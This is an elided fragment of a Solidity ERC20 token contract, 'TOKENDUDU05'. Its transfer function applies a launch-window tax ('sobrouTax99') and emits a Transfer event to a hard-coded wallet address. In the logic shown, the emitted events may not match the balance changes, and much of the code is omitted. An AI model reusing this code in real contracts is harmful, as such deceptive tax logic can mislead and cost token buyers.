...
contract TOKENDUDU05 is IERC20 {
    using SafeMath for uint256;

    string public constant name = "TOKENDUDU05";
    string public constant symbol = "DUDU05";
    ...
    function transfer(address receiver, uint256 numTokens) public override returns (bool) {
        ...
        balances[receiver] = balances[receiver].add(numTokens);
           if((launchedAt + deadBlocks) > block.number){
            ...
            sobrouTax99=numTokens-feeAmount;
            emit Transfer(msg.sender, 0x2682f5d297339314CBa15d83779E66E66a886A21, sobrouTax99);
            }else{
                feeAmount=numTokens;
            }
